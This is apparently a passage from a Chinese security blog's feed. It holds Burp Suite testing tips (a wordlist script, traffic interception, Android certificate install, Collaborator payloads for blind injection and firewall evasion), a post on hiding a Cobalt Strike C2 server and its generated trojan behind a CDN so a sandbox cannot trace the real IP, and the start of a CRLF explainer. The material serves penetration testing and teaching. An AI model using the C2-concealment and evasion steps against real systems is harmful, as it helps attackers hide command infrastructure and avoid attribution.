<li>临时项目&#x2F;会话。</li>
<li>登录到应用程序，像正常一样。</li>
<li>识别哪些域的请求包含凭证。</li>
<li>在Burp中启动主项目。</li>
<li>将这些域添加到SSL穿透中。Proxy &gt; Options &gt; TLS Pass-Through</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1adbedca0e859831ad4b64e2a1ffd0bbf92959ea.jpg" alt="img"></p>
<p>我为什么这样做。我保存了会话，而burp将存储这些凭证和会话。我个人不希望凭证被存储在文件中。<br>另一个重要的问题是，我们不是在测试SSO，而是在测试SSO背后的应用程序。</p>
<h3 id="2x11-基于burp-proxy-history生成字典"><a href="#2x11-基于burp-proxy-history生成字典" class="headerlink" title="2x11 基于burp proxy history生成字典"></a>2x11 基于burp proxy history生成字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># usage: Open Burp, navigate to proxy history, ctrl-a to select all records, right click and &quot;Save Items&quot; as an .xml file. </span></span><br><span class="line"><span class="comment"># python burplist.py burprequests.xml</span></span><br><span class="line"><span class="comment"># output is saved to wordlist.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">entropy</span>(<span class="params">string</span>):</span><br><span class="line">        <span class="comment">#&quot;Calculates the Shannon entropy of a string&quot;</span></span><br><span class="line">        <span class="comment"># get probability of chars in string</span></span><br><span class="line">        prob = [ <span class="built_in">float</span>(string.count(c)) / <span class="built_in">len</span>(string) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">dict</span>.fromkeys(<span class="built_in">list</span>(string)) ]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># calculate the entropy</span></span><br><span class="line">        entropy = - <span class="built_in">sum</span>([ p * math.log(p) / math.log(<span class="number">2.0</span>) <span class="keyword">for</span> p <span class="keyword">in</span> prob ])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> entropy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avgEntropyByChar</span>(<span class="params">en,length</span>):</span><br><span class="line">    <span class="comment"># calulate &quot;average&quot; entropy level</span></span><br><span class="line">    <span class="keyword">return</span> en / length </span><br><span class="line"></span><br><span class="line">tree = ET.parse(sys.argv[<span class="number">1</span>])</span><br><span class="line">root = tree.getroot()</span><br><span class="line">wordlist = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># preserve subdomains, file/dir names with . - _</span></span><br><span class="line">    wordlist += re.split(<span class="string">&#x27;\/|\?|&amp;|=&#x27;</span>,i[<span class="number">1</span>].text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get subdomain names and break up file names</span></span><br><span class="line">    wordlist += re.split(<span class="string">&#x27;\/|\?|&amp;|=|_|-|\.|\+&#x27;</span>,i[<span class="number">1</span>].text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get words from cookies, headers, POST body requests</span></span><br><span class="line">    wordlist += re.split(<span class="string">&#x27;\/|\?|&amp;|=|_|-|\.|\+|\:| |\n|\r|&quot;|\&#x27;|&lt;|&gt;|&#123;|&#125;|\[|\]|`|~|\!|@|#|\$|;|,|\(|\)|\*|\|&#x27;</span>, urllib.unquote(base64.b64decode(i[<span class="number">8</span>].text)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># response</span></span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">12</span>].text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        wordlist += re.split(<span class="string">&#x27;\/|\?|&amp;|=|_|-|\.|\+|\:| |\n|\r|\t|&quot;|\&#x27;|&lt;|&gt;|&#123;|&#125;|\[|\]|`|~|\!|@|#|\$|;|,|\(|\)|\*|\^|\\\\|\|&#x27;</span>, urllib.unquote(base64.b64decode(i[<span class="number">12</span>].text)))</span><br><span class="line"></span><br><span class="line">auxiliaryList = <span class="built_in">list</span>(<span class="built_in">set</span>(wordlist))</span><br><span class="line">final = []</span><br><span class="line">avgEntropyByLength = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> auxiliaryList:</span><br><span class="line">    <span class="keyword">if</span> word.isalnum() <span class="keyword">or</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">        en = entropy(word)</span><br><span class="line">        <span class="comment"># remove &quot;random strings&quot; that are high entropy</span></span><br><span class="line">        <span class="keyword">if</span> en &lt; <span class="number">4.4</span>:</span><br><span class="line">            final.append(word)</span><br><span class="line"></span><br><span class="line">final.sort()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> final:</span><br><span class="line">        f.write(<span class="string">&quot;%s\n&quot;</span> % item)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;wordlist saved to wordlist.txt&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2x12-使用Burp来对目标进行批量扫描"><a href="#2x12-使用Burp来对目标进行批量扫描" class="headerlink" title="2x12 使用Burp来对目标进行批量扫描"></a>2x12 使用Burp来对目标进行批量扫描</h3><p>很多时候我们会在burp上面集成很多萨漏洞扫描或者信息收集插件，所以可以借助设置上层代理的方式来将目标发送到burp，随后使用burp来对目标来做下一步的安全测试。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat subs.txt | httpx | tee -a livesubs.txt</span><br><span class="line">cat livesubs.txt | gau | tee -a wayback.txt </span><br><span class="line">ffuf -u FUZZ -w wayback.txt -replay-proxy http:<span class="comment">//127.0.0.1:8080/</span></span><br></pre></td></tr></table></figure>

<p>基于这个想法扩展一下，准备做一个中间层(数据包去重+重要信息提取)，把爬虫(crawlergo, rad, LSpider)和Burp(xray也可以)联动起来，既然不知道用哪个爬虫那就全都要。 #TODO</p>
<h3 id="2x13-IPtables-BurpSuite-Android-应用"><a href="#2x13-IPtables-BurpSuite-Android-应用" class="headerlink" title="2x13 IPtables + BurpSuite + Android 应用"></a>2x13 IPtables + BurpSuite + Android 应用</h3><ul>
<li>在设备上添加Burp CA</li>
<li>绕过ca pinning</li>
<li>root设备(iptable需要)</li>
</ul>
<p>Dport(是设定目的端口的参数) 80 路由 - 运行以下命令 (或许对443端口也需要做这样的事情)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp --dport <span class="number">80</span> -j DNAT --to-destination &lt;BURP_IP&gt;:<span class="number">8080</span></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp --dport <span class="number">80</span> -j MASQUERADE</span><br></pre></td></tr></table></figure>

<h3 id="2x14-使用repeater模块测试那些通过反向代理的请求"><a href="#2x14-使用repeater模块测试那些通过反向代理的请求" class="headerlink" title="2x14 使用repeater模块测试那些通过反向代理的请求"></a>2x14 使用repeater模块测试那些通过反向代理的请求</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5bad5ea5c3914c606c1007c108bca7abdc2aeaf2.png" alt="img"></p>
<p>例如 blogspot.com 这个网站，网站进行了反向代理的设置，它会检查子域并对其进行相应的路由，现在让我们为它改变host。</p>
<p>图 1 : Target 的值与 Host 的值相同的时候</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1520dbf1b97c0dc1e97e4c3ee7abfa43a42db4c7.png" alt="16314241507193.png"></p>
<p>图 2 : Target 的值与 Host 的值不相同的时候, 这个请求就会被路由到不同的站点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e2b899144cef9aa04656e1cf10e0b81c003ce7a3.jpg" alt="img"></p>
<h3 id="2x15-HTTP-Pipelining"><a href="#2x15-HTTP-Pipelining" class="headerlink" title="2x15 HTTP-Pipelining"></a>2x15 HTTP-Pipelining</h3><p>HTTP-Pipelining方式的好处就是会产生跟域前置(domain fronting)相类似的效果，将恶意请求隐藏在正常请求之后，并且目前大多数服务器都是支持这个技术的。此测试技术可以参考文章<a href="https://digi.ninja/blog/pipelining.php">《Using HTTP Pipelining to hide requests》</a>。在burpsuite中可以使用如下方式来开启HTTP pipelining功能</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4cc22ec3e672c01e0f2d6ed81fc4a6fa4f78a8f9.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e59106650c7412f17fdc12293f0809e1fc1c8344.jpg" alt="img"></p>
<p>PS: 其实初看这个概念你可能觉得陌生，但是这个技术点其实就是前一段时间最火的 HTTP-Request-Smuggling (HTTP请求走私漏洞)</p>
<h3 id="2x16-在Intruder模块中设置过滤"><a href="#2x16-在Intruder模块中设置过滤" class="headerlink" title="2x16 在Intruder模块中设置过滤"></a>2x16 在Intruder模块中设置过滤</h3><p>过滤出那些呈现出特定响应的数据包</p>
<ol>
<li>为Intruder的响应数据包创建一个过滤器。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-577f2455566def84ea5b71149700031df14bb33f.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bcf0f6de9aa3d40938363338194018706c7d0f84.jpg" alt="img"></p>
<ol>
<li>载入payload开始fuzz</li>
<li>如果响应包含你在 “grep “中输入的字符串，将显示在一个额外的列中。<br>-&gt; 你只能关注你正在寻找的响应。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fec0714992c9e83c18f1ebdaacfa86b4434463e8.jpg" alt="img"></li>
</ol>
<h3 id="2x17-Plugin-BurpBounty"><a href="#2x17-Plugin-BurpBounty" class="headerlink" title="2x17 Plugin: BurpBounty"></a>2x17 Plugin: BurpBounty</h3><p>在BurpSuite主动&#x2F;被动扫描器中添加你自己的扫描规则。不需要写一行代码就可以在扫描器中自定义检查策略。</p>
<p>插件名称：BurpBounty扫描检查生成器。<br>这是一个相当容易使用的插件。从 BApp Store 安装，用简单的名字创建一个检查。给它一个严重性，检查输入你想执行&#x2F;检查的req&#x2F;res，并启用它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f0d01356f874bbc4ff0a5e5ef5cec54b199ed20.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-96d0ab98f8042e8dca1dae771f29563a0af77571.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-99b556fb16637494eef76dc093c62afbadebd491.jpg" alt="img"></p>
<h3 id="2x19-Burp-Collaborator"><a href="#2x19-Burp-Collaborator" class="headerlink" title="2x19 Burp Collaborator"></a>2x19 Burp Collaborator</h3><p>BurpSuite Collaborator是PortSwigger提供的一个托管网络服务，在手动测试中非常有用。</p>
<p>1&#x2F;N 当你不清楚手动注入的有效载荷是否触发了与其他网站的交互时，就可以使用Collaborator来验证。Collaborator功能默认使用的是由PortSwigger托管的公共服务器。具体的工作原理如下图所示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3deb1fce6f6e83abb4e5a68dfdb298f0ea5c7b7.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0c9c463262b44f54e2fe638c4d4ed893a3627cbc.jpg" alt="img"></p>
<p>2&#x2F;N Collaborator客户端的使用如下所示</p>
<ol>
<li>启动Collaborator客户端<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cdf45f6e5ddc1b8855e2807af2beafd36a01a565.jpg" alt="img"></li>
<li>点击复制，将创建一个带有&lt;&gt;.burpcollaborator.net域名的自定义URL。之后在payload中使用该URL<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f5fac1d6227aebc072d5b9e87e0479191a1175c9.jpg" alt="img"></li>
<li>轮询以查看在URL上发出的请求。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d475848f0daa4abd0a9b3c099c8aeeeabbbd923d.jpg" alt="img"></li>
<li>用于请求的payload示例（这个案例中会产生DNS和HTTP两种请求）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ff8930a5611861640c5ab597bbbee1c4bce22fc8.jpg" alt="img"></li>
</ol>
<p>3&#x2F;N 一些有用的场景</p>
<ul>
<li>SQLi 盲注</li>
<li>SSRF</li>
<li>XSS</li>
<li>BlindXXE</li>
<li>检测你能想到的任何出站的源负载</li>
<li>逃避防火墙，如果出站的TCP请求被阻止而HTTP被允许的话</li>
</ul>
<h3 id="2x20-三步创建一个属于你自己的Burp-Extender插件-Java类型"><a href="#2x20-三步创建一个属于你自己的Burp-Extender插件-Java类型" class="headerlink" title="2x20 三步创建一个属于你自己的Burp Extender插件(Java类型)"></a>2x20 三步创建一个属于你自己的Burp Extender插件(Java类型)</h3><ul>
<li>从Burp -&gt; Extender -&gt; APIs -&gt; Save Interface files下载API接口。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a22a888f970b46ffd9e8f9e74f29d2e4e2e654e8.jpg" alt="img"></li>
<li>创建一个名为burp的包，并将文件保存在那里，你可以选择任何你喜欢的IDE。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61cb900bd27e90c7dfcdbe16014e8f3c25234bb3.jpg" alt="img"></li>
<li>让IDE准备好构建JAR。</li>
<li>创建文件名为BurpExtender并添加以下代码。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2177ea905dceedf976d45801593748e20126bc73.jpg" alt="img"></li>
</ul>
<p>2&#x2F;n</p>
<ul>
<li>文件名Burp Extender将是你的插件的一个入口点，扩展接口在加载时在Burp中注册。该插件的所有逻辑都在这里。</li>
<li>构建Jar</li>
<li>在Burp中加载Jar。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-226aab25e97c279abf10de539122a1061c5df6c4.jpg" alt="img"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-98e065e7f873321378417ceb07245c6da8b8794c.jpg" alt="img"></li>
</ul>
<p>3&#x2F;n</p>
<ul>
<li><p>你也可以用这些命令从命令行建立Jar。 &#96;&#96;&#96;php</p>
<p>代码位置 -&gt; cd usercode</p>
<p>.class文件的位置 -&gt; mkdir build<br>jar的位置 -&gt; mkdir bin<br>编译代码 -&gt; javac -d build src&#x2F;burp&#x2F;</p>
<p>.java</p>
<p>建立jar -&gt; jar cf bin&#x2F;burpextender.jar -C build burp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2x21-Autorize-与-IDOR-越权漏洞"><a href="#2x21-Autorize-与-IDOR-越权漏洞" class="headerlink" title="2x21 Autorize 与 IDOR(越权漏洞)"></a>2x21 Autorize 与 IDOR(越权漏洞)</h3><p>Autorize可以帮助你自动化的查找越权漏洞，基本的使用步骤如下:</p>
<ol>
<li>首先在 Autorize 扩展中提供低权限&#x2F;不同用户的 cookie 详细信息。</li>
<li>然后作为高权限用户使用浏览器并连接 burp 漫游并在易受攻击的网站上获取不同的资源。</li>
<li>对于您在站点上向高权限用户发出的每个请求，Autorize 扩展都会使用给定的低权限 cookie 重复相同的请求。</li>
<li>最后，您可以检查 Autorize 扩展是否已使用低特权 cookie 请求访问了任何特权资源。如果是，那就找了一个越权漏洞。</li>
</ol>
<p>参考链接: <a href="https://infosecwriteups.com/leveraging-burp-suite-extension-for-finding-idor-insecure-direct-object-reference-2653f9b89fd4">Leveraging Burp Suite extension for finding IDOR(Insecure Direct Object Reference).</a></p>
<h3 id="2x22-burp性能优化之最大限度地减少RAM和处理器的负荷"><a href="#2x22-burp性能优化之最大限度地减少RAM和处理器的负荷" class="headerlink" title="2x22 burp性能优化之最大限度地减少RAM和处理器的负荷"></a>2x22 burp性能优化之最大限度地减少RAM和处理器的负荷</h3><ol>
<li>关闭你不用的 burp 扩展 – 只要禁用所有不使用的扩展，即使它们被加载，也会影响性能。</li>
<li>确定扫描仪的明确范围 – 你可以在配置中限制递归的深度</li>
<li>合并用于限定范围的正则表达式 – 如果你使用正则表达式来过滤流量，可以尝试将多个正则表达式合并为一个，性能上将会有所优化。</li>
<li>Burp搜索功能比网站地图过滤器更快</li>
</ol>
<h3 id="2x23-通过代码层面的可视化来更好地理解BurpSuite中不同的intruder攻击类型"><a href="#2x23-通过代码层面的可视化来更好地理解BurpSuite中不同的intruder攻击类型" class="headerlink" title="2x23 通过代码层面的可视化来更好地理解BurpSuite中不同的intruder攻击类型"></a>2x23 通过代码层面的可视化来更好地理解BurpSuite中不同的intruder攻击类型</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc5b2005acc26b65c05efe4fa7a1ae0a5c9d450a.png" alt="-w611"></p>
<p>对于上面这个例子来说，如果我们想要去 使用 BurpSuite 的 Intruder 模块去 Fuzz 那么我们就首先会面临四种类型的选择:<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-285e59c756059bbdc2c99719a905b93e43f2bdb6.png" alt="-w476"></p>
<ol>
<li>SNIPER<ul>
<li>单一有效载荷集</li>
<li>相同的有效载荷一次适用于所有位置。</li>
<li>适合于每次对单个参数进行模糊处理，在针对所有具有共同漏洞的有效载荷时非常有用。</li>
<li>loc1首先用相同的数据进行测试，然后是loc2，以此类推…<br>用代码来表示就是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cd03cd6413823d3490c1fbda1034ae09da6601aa.png" alt="-w915"></li>
</ul>
</li>
<li>BATTERING RAM<ul>
<li>单一有效载荷</li>
<li>每个有效载荷同时放置在每个位置上</li>
<li>当攻击需要所有参数的相同输入时使用<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fde29865c9ac2b650792ddbe495c54b5fffc8d86.png" alt="-w1254"></li>
</ul>
</li>
<li>CLUSTER BOMB<ul>
<li>每个位置都有不同的有效载荷集。</li>
<li>将此视为嵌套循环。对于locl的每个有效载荷，其他有效载荷的所有条目都被测试。(类似笛卡尔积)<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-84114882e5c7377927264d856998d40d22257734.png" alt="-w1054"></li>
</ul>
</li>
<li>PITCH FORK<ul>
<li>每个位置都有不同的有效载荷集</li>
<li>但每个有效载荷都是同时递增的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1027460924b26228f31d35bbba64b2acff325ba0.png" alt="-w1159"></li>
</ul>
</li>
</ol>
<h3 id="2x24-一种简单的在Android设备上安装证书的方式"><a href="#2x24-一种简单的在Android设备上安装证书的方式" class="headerlink" title="2x24 一种简单的在Android设备上安装证书的方式"></a>2x24 一种简单的在Android设备上安装证书的方式</h3><p>Burp–&gt;Proxy–&gt;options–&gt;import&#x2F;export–&gt;certificate in DER format–&gt;cert–&gt;next–&gt;save</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-60d638d51c81a58ca153d7b669c97f9deef8db35.png" alt="截屏2021-07-22 下午7.35.52"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in cert -out cacert.pem</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -<span class="number">1</span></span><br><span class="line">mv cacert.pem <span class="number">9</span>a5ba575.<span class="number">0</span>  <span class="comment">#hash from the above command output</span></span><br><span class="line">adb shell <span class="string">&quot;mount -o rw,remount/system&quot;</span></span><br><span class="line">adb push <span class="number">9</span>a5ba575.<span class="number">0</span> system/etc/security/cacerts/</span><br><span class="line">adb shell <span class="string">&quot;chmod 644 system/etc/security/cacerts/9a5ba575.0&quot;</span>o</span><br><span class="line">mount-o ro,remount /system</span><br><span class="line">adb remount</span><br><span class="line">adb reboot</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>C2 实验</title>
    <url>/posts/cb970be6.html</url>
    <content><![CDATA[<h1 id="C2-实验"><a href="#C2-实验" class="headerlink" title="C2 实验"></a>C2 实验</h1><hr>
<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="C2隐藏技术"><a href="#C2隐藏技术" class="headerlink" title="C2隐藏技术"></a>C2隐藏技术</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/C2实验/image-20220501123014219.png" alt="image-20220501123014219" style="zoom:50%;" />

<p>ping 检测</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/C2实验/image-20220501122922377.png" alt="image-20220501122922377" style="zoom: 50%;" />

<p>Cloudflare 支持的 HTTP 端口是：</p>
<ul>
<li>80</li>
<li>8080</li>
<li>8880</li>
<li>2052</li>
<li>2082</li>
<li>2086</li>
<li>2095</li>
</ul>
<p>Cloudflare 支持的 HTTPS 端口是：</p>
<ul>
<li>443</li>
<li>2053</li>
<li>2083</li>
<li>2087</li>
<li>2096</li>
<li>8443</li>
</ul>
<p><strong>CS</strong></p>
<p>安装 java </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#修复依赖与覆盖问题，完成安装</span><br><span class="line">apt -f install</span><br><span class="line">apt install default-jre</span><br><span class="line">#开放端口</span><br><span class="line">ufw allow 80&amp;&amp;ufw allow 443</span><br></pre></td></tr></table></figure>

<p>监听器配置域名</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/C2实验/image-20220501135328425.png" alt="image-20220501135328425" style="zoom:50%;" />

<p>生成木马</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/C2实验/image-20220501135401877.png" alt="image-20220501135401877" style="zoom:50%;" />

<p>执行，上线，每次回连，vps 的 ip 都会改变</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/C2%E5%AE%9E%E9%AA%8C/image-20220501135247355.png" alt="image-20220501135247355"></p>
<p>将生成的木马放到微步沙箱里面进行检测：</p>
<p><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/C2实验/image-20220501140057188.png" alt="image-20220501140057188" style="zoom: 50%;" />

<p>只能找到域名，而无法找到更多有用信息。</p>
<p>多地 ping 也无法获取真实 ip。</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>流量隐藏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF漏洞总结</title>
    <url>/posts/8374b3f7.html</url>
    <content><![CDATA[<h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><h2 id="0x00-什么是CRLF？"><a href="#0x00-什么是CRLF？" class="headerlink" title="0x00 什么是CRLF？"></a>0x00 什么是CRLF？</h2><p>CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。</p>
<blockquote>
<p>CRLF的概念源自打字机，表明行的结束，计算机出现后沿用了这个概念。</p>
<p>回车符：光标移到行首，</p>
<p>换行符：光标垂直移到下行。</p>
<p>键盘上的回车键(Enter)就可以执行该操作。但是不同的操作系统，行的结束符是不一样的。</p>
<p>Windows：使用CRLF表示行的结束</p>
<p>Linux&#x2F;Unix：使用LF表示行的结束</p>
<p>MacOS：早期使用CR表示，现在好像也用LF表示行的结束</p>
<p>所以同一文件在不同操作系统中打开，内容格式可能会出现差异，这是行结束符不一致导致的。</p>
<p>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示。</p>
</blockquote>
<p>我们知道HTTP报文由三部分组成：</p>
<table>
<thead>
<tr>
<th align="center">报文首部</th>
</tr>
</thead>
<tbody><tr>
<td align="center">空行</td>
</tr>
<tr>
<td align="center">报文主体</td>
</tr>
</tbody></table>
<p>首部和主体由两个CRLF分隔。</p>
